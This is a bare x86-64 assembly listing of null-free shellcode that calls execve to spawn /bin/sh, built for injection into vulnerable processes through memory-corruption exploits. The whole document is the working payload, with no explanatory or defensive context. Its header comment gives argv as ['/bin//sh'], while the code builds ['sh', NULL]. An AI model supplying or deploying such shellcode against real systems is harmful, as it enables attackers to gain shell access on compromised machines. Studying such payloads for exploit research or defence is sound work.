; execve("/bin//sh", ["/bin//sh"], [NULL]), null-free, 30 bytes
BITS 64
xor eax, eax
push rax                ; null termination
mov rdx, 0x68732f2f6e69622f ; "/bin//sh"
push rdx
push rsp
pop rdi                 ; path -> "/bin//sh"

push rax                ; NULL
push rsp
pop rdx                 ; envp -> [NULL]

lea rcx, [rdi+6]        ; "sh"
push rcx
push rsp
pop rsi                 ; argv -> ["sh", NULL]

mov al, 59              ; __NR_execve
syscall
